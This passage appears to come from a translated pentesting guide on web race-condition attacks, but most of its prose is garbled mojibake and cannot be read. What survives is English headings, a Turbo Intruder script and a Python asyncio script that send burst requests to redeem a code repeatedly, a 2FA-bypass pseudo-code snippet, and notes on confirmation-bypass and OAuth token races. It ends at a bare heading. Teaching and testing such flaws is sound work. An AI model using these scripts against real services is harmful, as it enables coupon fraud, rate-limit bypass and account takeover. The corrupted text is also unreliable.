рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рд╕реБрдзрд╛рд░ RC рдореЗрдВ рд╣рдорд▓реЗ рдХреЛ рдЕрдзрд┐рдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдмрдирд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реИрдХрдбрд╝реЛрдВ/рд╣рдЬрд╛рд░реЛрдВ рдкреИрдХреЗрдЯ рдПрдХ рд╕рд╛рде рдЖрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рдХреБрдЫ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рд╕реАрдорд╛рдПрдБ рднреА рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдХреБрдЫ рд▓реЛрдХрдкреНрд░рд┐рдп HTTP рд╕рд░реНрд╡рд░ рдЬреИрд╕реЗ Apache, Nginx рдФрд░ Go рдореЗрдВ `SETTINGS_MAX_CONCURRENT_STREAMS` рд╕реЗрдЯрд┐рдВрдЧ рдХреНрд░рдорд╢рдГ 100, 128 рдФрд░ 250 рд╣реИред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЕрдиреНрдп рдЬреИрд╕реЗ NodeJS рдФрд░ nghttp2 рдореЗрдВ рдпрд╣ рдЕрд╕реАрдорд┐рдд рд╣реИред\
рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рд╣реИ рдХрд┐ Apache рдПрдХрд▓ TCP рдХрдиреЗрдХреНрд╢рди рд╕реЗ рдХреЗрд╡рд▓ 100 HTTP рдХрдиреЗрдХреНрд╢рдиреЛрдВ рдкрд░ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдЧрд╛ (рдЗрд╕ RC рд╣рдорд▓реЗ рдХреЛ рд╕реАрдорд┐рдд рдХрд░рдирд╛)ред

рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main) рдкрд░ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред

## Raw BF

рдкрд┐рдЫрд▓реЗ рд╢реЛрдз рд╕реЗ рдкрд╣рд▓реЗ рдХреБрдЫ рдкреЗрд▓реЛрдбреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬреЛ рдмрд╕ рдкреИрдХреЗрдЯ рдХреЛ рдЬрд┐рддрдиреА рдЬрд▓реНрджреА рд╣реЛ рд╕рдХреЗ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рдереЗ рддрд╛рдХрд┐ рдПрдХ RC рдХрд╛ рдХрд╛рд░рдг рдмрди рд╕рдХреЗред

* **Repeater:** рдкрд┐рдЫрд▓реЗ рдЕрдиреБрднрд╛рдЧ рд╕реЗ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВред
* **Intruder**: **Intruder** рдХреЛ **request** рднреЗрдЬреЗрдВ, **Options menu** рдХреЗ рдЕрдВрджрд░ **threads рдХреА рд╕рдВрдЦреНрдпрд╛** рдХреЛ **30** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ, рдФрд░ рдкреЗрд▓реЛрдб рдХреЗ рд░реВрдк рдореЗрдВ **Null payloads** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ **30** рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВред
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

рдпрд╣ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХрд╛ рд╕рдмрд╕реЗ рдмреБрдирд┐рдпрд╛рджреА рдкреНрд░рдХрд╛рд░ рд╣реИ рдЬрд╣рд╛рдБ **рдХрдордЬреЛрд░рд┐рдпрд╛рдБ** рдЙрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ **рдкреНрд░рдХрдЯ** рд╣реЛрддреА рд╣реИрдВ рдЬреЛ **рдЖрдкрдХреЛ рдПрдХ рдХреНрд░рд┐рдпрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рддрдиреА рдмрд╛рд░ рд╕реАрдорд┐рдд рдХрд░рддреЗ рд╣реИрдВ**ред рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╡реЗрдм рд╕реНрдЯреЛрд░ рдореЗрдВ рдПрдХ рд╣реА рдЫреВрдЯ рдХреЛрдб рдХрд╛ рдХрдИ рдмрд╛рд░ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ред рдПрдХ рдмрд╣реБрдд рдЖрд╕рд╛рди рдЙрджрд╛рд╣рд░рдг [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) рдпрд╛ [**рдЗрд╕ рдмрдЧ**](https://hackerone.com/reports/759247)** рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред**

рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдХреЗ рдХрдИ рд░реВрдк рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:

* рдПрдХ рдЙрдкрд╣рд╛рд░ рдХрд╛рд░реНрдб рдХреЛ рдХрдИ рдмрд╛рд░ рднреБрдирд╛рдирд╛
* рдПрдХ рдЙрддреНрдкрд╛рдж рдХреЛ рдХрдИ рдмрд╛рд░ рд░реЗрдЯрд┐рдВрдЧ рджреЗрдирд╛
* рдЕрдкрдиреЗ рдЦрд╛рддреЗ рдХреЗ рдмреИрд▓реЗрдВрд╕ рд╕реЗ рдЕрдзрд┐рдХ рдирдХрдж рдирд┐рдХрд╛рд▓рдирд╛ рдпрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рд┐рдд рдХрд░рдирд╛
* рдПрдХ рд╣реА CAPTCHA рд╕рдорд╛рдзрд╛рди рдХрд╛ рдкреБрди: рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛
* рдПрдВрдЯреА-рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рджрд░ рд╕реАрдорд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

### **Hidden substates**

рдЬрдЯрд┐рд▓ рд░реЗрд╕ рдХрдВрдбреАрд╢рдиреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдЕрдХреНрд╕рд░ рдЫрд┐рдкреЗ рд╣реБрдП рдпрд╛ **рдЕрдирдкреЗрдХреНрд╖рд┐рдд рдорд╢реАрди рдЙрдк-рд░рд╛рдЬреНрдпреЛрдВ** рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЕрд╡рд╕рд░реЛрдВ рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реЗ рдирд┐рдкрдЯреЗрдВ:

1. **рд╕рдВрднрд╛рд╡рд┐рдд рдЫрд┐рдкреЗ рд╣реБрдП рдЙрдк-рд░рд╛рдЬреНрдпреЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░реЗрдВ**
* рдЙрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдкрд╣рдЪрд╛рдирдиреЗ рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ рдЬреЛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдпрд╛ рдмрд╛рддрдЪреАрдд рдХрд░рддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░реЛрдлрд╛рдЗрд▓ рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБред рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░реЗрдВ:
* **рд╕реНрдЯреЛрд░реЗрдЬ**: рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╕реНрдерд╛рдпреА рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рд╡рд╛рд▓реЗ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрдВ, рди рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдбреЗрдЯрд╛ рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рд╡рд╛рд▓реЗред
* **рдХреНрд░рд┐рдпрд╛**: рдЙрди рдСрдкрд░реЗрд╢рдиреЛрдВ рдХреА рддрд▓рд╛рд╢ рдХрд░реЗрдВ рдЬреЛ рдореМрдЬреВрджрд╛ рдбреЗрдЯрд╛ рдХреЛ рдмрджрд▓рддреЗ рд╣реИрдВ, рдЬреЛ рдирдП рдбреЗрдЯрд╛ рдЬреЛрдбрд╝рдиреЗ рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рд╕реНрдерд┐рддрд┐рдпрд╛рдБ рдмрдирд╛рдиреЗ рдХреА рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛ рд░рдЦрддреЗ рд╣реИрдВред
* **рдХреАрдЗрдВрдЧ**: рд╕рдлрд▓ рд╣рдорд▓реЗ рдЖрдорддреМрд░ рдкрд░ рдЙрд╕реА рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рдкрд░ рдХреА рдЧрдИ рдСрдкрд░реЗрд╢рдиреЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рд░реАрд╕реЗрдЯ рдЯреЛрдХрдиред
2. **рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ**
* рдкрд╣рдЪрд╛рдиреЗ рдЧрдП рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рд╣рдорд▓реЛрдВ рдХреЗ рд╕рд╛рде рдкрд░реАрдХреНрд╖рдг рдХрд░реЗрдВ, рдХрд┐рд╕реА рднреА рдЕрдкреЗрдХреНрд╖рд┐рдд рдкрд░рд┐рдгрд╛рдореЛрдВ рд╕реЗ рд╡рд┐рдЪрд▓рди рдХреЗ рд▓рд┐рдП рдЕрд╡рд▓реЛрдХрди рдХрд░реЗрдВред рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдпрд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╡реНрдпрд╡рд╣рд╛рд░ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рдПрдХ рдХрдордЬреЛрд░реА рдХрд╛ рд╕рдВрдХреЗрдд рджреЗ рд╕рдХрддреЗ рд╣реИрдВред
3. **рдХрдордЬреЛрд░реА рдХрд╛ рдкреНрд░рджрд░реНрд╢рди рдХрд░реЗрдВ**
* рд╣рдорд▓реЗ рдХреЛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдиреНрдпреВрдирддрдо рдЕрдиреБрд░реЛрдзреЛрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рддрдХ рд╕реАрдорд┐рдд рдХрд░реЗрдВ, рдЕрдХреНрд╕рд░ рдХреЗрд╡рд▓ рджреЛред рдЗрд╕ рдЪрд░рдг рдореЗрдВ рд╕рдЯреАрдХ рд╕рдордп рдХреЗ рдХрд╛рд░рдг рдХрдИ рдкреНрд░рдпрд╛рд╕реЛрдВ рдпрд╛ рд╕реНрд╡рдЪрд╛рд▓рди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред

### Time Sensitive Attacks

рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд╕рдордп рдореЗрдВ рд╕рдЯреАрдХрддрд╛ рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреА рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЬрдм рд╕реБрд░рдХреНрд╖рд╛ рдЯреЛрдХрдиреЛрдВ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рдирд┐рдд рд╡рд┐рдзрд┐рдпреЛрдВ рдЬреИрд╕реЗ рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдорд╛рдирд╛рдВрддрд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рд╕рдорд╛рди рдЯреЛрдХрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

**рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:**

* рд╕рдЯреАрдХ рд╕рдордп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ, рдЬреИрд╕реЗ рдПрдХрд▓ рдкреИрдХреЗрдЯ рд╣рдорд▓рд╛, рд╕рдорд╛рдирд╛рдВрддрд░ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЕрдиреБрд░реЛрдз рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред рд╕рдорд╛рди рдЯреЛрдХрди рдПрдХ рдХрдордЬреЛрд░реА рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреЗ рд╣реИрдВред

**рдЙрджрд╛рд╣рд░рдг:**

* рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рджреЛ рдкрд╛рд╕рд╡рд░реНрдб рд░реАрд╕реЗрдЯ рдЯреЛрдХрди рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░реЗрдВ рдФрд░ рдЙрдирдХреА рддреБрд▓рдирд╛ рдХрд░реЗрдВред рдореЗрд▓ рдЦрд╛рддреЗ рдЯреЛрдХрди рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдореЗрдВ рдПрдХ рджреЛрд╖ рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддреЗ рд╣реИрдВред

**рдЗрд╕реЗ рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **рдХреЛ рджреЗрдЦреЗрдВред**

## Hidden substates case studies

### Pay & add an Item

рдЗрд╕реЗ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) рдкрд░ рдЬрд╛рдПрдБ рдХрд┐ рдХреИрд╕реЗ **рднреБрдЧрддрд╛рди** рдХрд░реЗрдВ рдФрд░ **рдПрдХ рдЕрддрд┐рд░рд┐рдХреНрдд** рдЖрдЗрдЯрдо **рдЬреЛрдбрд╝реЗрдВ** рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП **рдЖрдкрдХреЛ рднреБрдЧрддрд╛рди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ**ред

### Confirm other emails

рд╡рд┐рдЪрд╛рд░ рдпрд╣ рд╣реИ рдХрд┐ **рдПрдХ рдИрдореЗрд▓ рдкрддреЗ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рдЕрд▓рдЧ рдореЗрдВ рдмрджрд▓реЗрдВ** рдпрд╣ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдирдП рдмрджрд▓реЗ рдЧрдП рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред

### Change email to 2 emails addresses Cookie based

[**рдЗрд╕ рд╢реЛрдз**](https://portswigger.net/research/smashing-the-state-machine) рдХреЗ рдЕрдиреБрд╕рд╛рд░, Gitlab рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдЕрдзрд┐рдЧреНрд░рд╣рдг рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░ рдерд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ **рдПрдХ рдИрдореЗрд▓ рдХреЗ рдИрдореЗрд▓ рд╕рддреНрдпрд╛рдкрди рдЯреЛрдХрди рдХреЛ рджреВрд╕рд░реЗ рдИрдореЗрд▓ рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ**ред

**рдЗрд╕реЗ рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **рдХреЛ рджреЗрдЦреЗрдВред**

### Hidden Database states / Confirmation Bypass

рдпрджрд┐ **2 рдЕрд▓рдЧ-рдЕрд▓рдЧ рд▓реЗрдЦрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЬрд╛рдирдХрд╛рд░реА** рдХреЛ **рдбреЗрдЯрд╛рдмреЗрд╕** рдХреЗ рдЕрдВрджрд░ **рдЬреЛрдбрд╝рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдПрдХ рдЫреЛрдЯрд╛ рд╕рд╛ рд╕рдордп рд╣реЛрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ **рдХреЗрд╡рд▓ рдкрд╣рд▓рд╛ рдбреЗрдЯрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рдЕрдВрджрд░ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рд╣реИ**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб** **рд▓рд┐рдЦреЗ** рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдлрд┐рд░ рдЯреЛрдХрди** рдирдП рдмрдирд╛рдП рдЧрдП рдЦрд╛рддреЗ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд┐рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХ рдЫреЛрдЯреЗ рд╕рдордп рдХреЗ рд▓рд┐рдП **рдЦрд╛рддреЗ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рд╢реВрдиреНрдп рд╣реИ**ред

рдЗрд╕рд▓рд┐рдП **рдПрдХ рдЦрд╛рддрд╛ рдкрдВрдЬреАрдХреГрдд рдХрд░рдирд╛ рдФрд░ рддреБрд░рдВрдд рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЦрд╛рд▓реА рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдХрдИ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛** (`token=` рдпрд╛ `token[]=` рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рднрд┐рдиреНрдирддрд╛) рдПрдХ рдРрд╕рд╛ рдЦрд╛рддрд╛ **рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдБ рдЖрдк рдИрдореЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВред

**рдЗрд╕реЗ рдЖрдЬрдорд╛рдиреЗ рдХреЗ рд▓рд┐рдП** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **рдХреЛ рджреЗрдЦреЗрдВред**

### Bypass 2FA

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд╕реЗрдЙрдбреЛ-рдХреЛрдб рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдмрд╣реБрдд рдЫреЛрдЯреЗ рд╕рдордп рдореЗрдВ **2FA рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддрд╛** рдЬрдмрдХрд┐ рд╕рддреНрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 рд╢рд╛рд╢реНрд╡рдд рд╕реНрдерд╛рдпреАрддрд╛

рдХрдИ [**OAUth рдкреНрд░рджрд╛рддрд╛**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) рд╣реИрдВред рдпреЗ рд╕реЗрд╡рд╛рдПрдБ рдЖрдкрдХреЛ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдиреЗ рдФрд░ рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдкреНрд░рдорд╛рдгрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреА рдЬрд┐рдиреНрд╣реЗрдВ рдкреНрд░рджрд╛рддрд╛ рдиреЗ рдкрдВрдЬреАрдХреГрдд рдХрд┐рдпрд╛ рд╣реИред рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **рдХреНрд▓рд╛рдЗрдВрдЯ** рдХреЛ **рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди** рдХреЛ **OAUth рдкреНрд░рджрд╛рддрд╛** рдХреЗ рдЕрдВрджрд░ рдЙрдирдХреЗ рдХреБрдЫ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА **рдЕрдиреБрдорддрд┐** рджреЗрдиреА рд╣реЛрдЧреАред\
рддреЛ, рдпрд╣рд╛рдБ рддрдХ рдмрд╕ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓реЙрдЧрд┐рди рд╣реИ рдЬреИрд╕реЗ google/linkedin/github... рдЬрд╣рд╛рдБ рдЖрдкрдХреЛ рдПрдХ рдкреГрд╖реНрда рдкрд░ рд╕рдВрдХреЗрдд рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ: "_рдПрдкреНрд▓рд┐рдХреЗрд╢рди \<InsertCoolName> рдЖрдкрдХреА рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд░рдЦрддрд╛ рд╣реИ, рдХреНрдпрд╛ рдЖрдк рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ?_"

#### `authorization_code` рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди

**рд╕рдорд╕реНрдпрд╛** рддрдм рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИ рдЬрдм рдЖрдк **рдЗрд╕реЗ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддреЗ рд╣реИрдВ** рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдПрдХ **`authorization_code`** рдХреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рднреЗрдЬрддреЗ рд╣реИрдВред рдлрд┐рд░, рдпрд╣ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди OAUth рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдкрдХреЗ рдЦрд╛рддреЗ рдХреЗ рд▓рд┐рдП **`authorization_code`** рд╕реЗ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ AT/RT (_Authentication Token/Refresh Token_) рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХреЗред рдореВрд▓ рд░реВрдк рд╕реЗ, рдпрд╣ рдЗрд╕ рддрдереНрдп рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рдХрд┐ рдЖрдкрдиреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рд╣реИ рддрд╛рдХрд┐ **рдХрдИ рдЦрд╛рддреЗ рдмрдирд╛рдП рдЬрд╛ рд╕рдХреЗрдВ**ред рдлрд┐рд░, рдпрджрд┐ рдЖрдк **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдЕрдкрдиреЗ рдбреЗрдЯрд╛ рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВ, рддреЛ AT/RT рдХрд╛ рдПрдХ рдЬреЛрдбрд╝рд╛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рд▓реЗрдХрд┐рди рдЕрдиреНрдп рдЕрднреА рднреА рдорд╛рдиреНрдп рд░рд╣реЗрдВрдЧреЗ**ред

#### `Refresh Token` рдореЗрдВ рд░реЗрд╕ рдХрдВрдбреАрд╢рди

